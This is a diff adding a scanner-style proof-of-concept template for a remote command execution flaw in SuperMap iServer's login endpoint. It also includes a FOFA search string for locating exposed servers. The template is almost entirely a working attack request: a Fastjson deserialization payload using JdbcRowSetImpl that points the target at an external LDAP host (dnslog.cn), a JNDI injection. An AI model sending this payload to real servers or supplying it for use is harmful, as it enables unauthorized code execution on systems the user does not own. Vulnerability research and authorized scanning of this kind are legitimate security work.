@@ -1,0 +1,19 @@
+id: poc-pukhvze0ifddfc2t
+info:
+  name: SuperMap-iServer login 远程命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/pukhvze0ifddfc2t'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: pukhvze0ifddfc2t
+    fofa: body="/iserver/manager/"
+http:
+- raw:
+  - "POST /iserver/services/security/login.json?_t=1655187360048 HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0\nConnection: close\nAccept-Encoding: gzip, deflate\nContent-Type: application/json\n\n{\n\"rasdnd1\": {\n\t\"@type\": \"java.lang.Class\",\n\t\"val\": \"com.sun.rowset.JdbcRowSetImpl\"\n},\n\"randfd2\": {\n\t\"@type\": \"com.sun.rowset.JdbcRowSetImpl\",\n\t\"dataSourceName\": \"ldap://dnslog.cn\",\n\t\"autoCommit\": true\n}\n}"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
